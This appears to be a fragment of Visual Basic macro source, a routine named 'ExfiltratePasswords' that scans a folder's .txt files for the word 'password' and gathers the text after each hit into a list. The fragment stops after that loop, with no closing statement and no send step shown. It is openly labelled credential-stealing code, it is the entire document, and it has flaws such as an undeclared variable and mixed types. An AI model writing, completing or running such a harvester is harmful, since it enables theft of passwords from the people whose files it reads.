Sub ExfiltratePasswords()
    Dim fso As Object
    Dim folder As Object
    Dim file As Object
    Dim text As String
    Dim password As String
    Dim passwordList As String
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set folder = fso.GetFolder("C:\Path\To\Directory")
    
    passwordList = ""
    
    For Each file In folder.Files
        If LCase(Right(file.Name, 4)) = ".txt" Then
            Set objTextFile = fso.OpenTextFile(file.Path, 1)
            text = objTextFile.ReadAll
            objTextFile.Close
            
            password = InStr(1, text, "password", vbTextCompare)
            If password <> 0 Then
                password = Mid(text, password + 9)
                passwordList = passwordList & password & vbCrLf
            End If
        End If
    Next file
